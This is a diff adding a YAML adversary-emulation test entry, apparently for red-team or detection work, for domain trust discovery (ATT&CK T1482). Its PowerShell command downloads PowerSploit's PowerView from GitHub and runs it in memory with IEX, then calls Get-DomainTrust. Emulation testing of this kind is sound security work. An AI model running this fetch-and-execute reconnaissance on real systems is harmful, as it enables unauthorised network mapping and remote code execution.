@@ -1,0 +1,13 @@
+- id: 950613fe-bbb1-579c-8fca-af9995b40a33
+  name: Soumaia ART Tests - Get-DomainTrust with PowerView
+  description: Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.
+  tactic: discovery
+  technique:
+    attack_id: T1482
+    name: Domain Trust Discovery
+  platforms:
+    windows:
+      psh:
+        command: |-
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose
